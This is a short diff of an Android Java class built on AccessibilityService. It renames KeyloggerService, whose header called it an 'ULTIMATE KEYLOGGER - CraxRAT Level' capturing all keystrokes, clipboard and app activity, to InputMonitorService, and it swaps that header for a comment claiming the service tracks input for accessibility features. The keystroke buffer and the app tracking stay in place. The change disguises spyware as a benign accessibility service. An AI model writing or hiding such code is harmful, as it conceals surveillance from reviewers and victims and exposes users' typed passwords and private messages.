@@ -13,10 +13,9 @@ import org.json.JSONObject;
 import java.util.List;
 
 /**
- * ULTIMATE KEYLOGGER - CraxRAT Level
- * Captures all keystrokes, clipboard, and app activity
+ * Input monitoring service - tracks user interactions for accessibility features
  */
-public class KeyloggerService extends AccessibilityService {
+public class InputMonitorService extends AccessibilityService {
 
     private StringBuilder keyBuffer = new StringBuilder();
     private String currentApp = "";
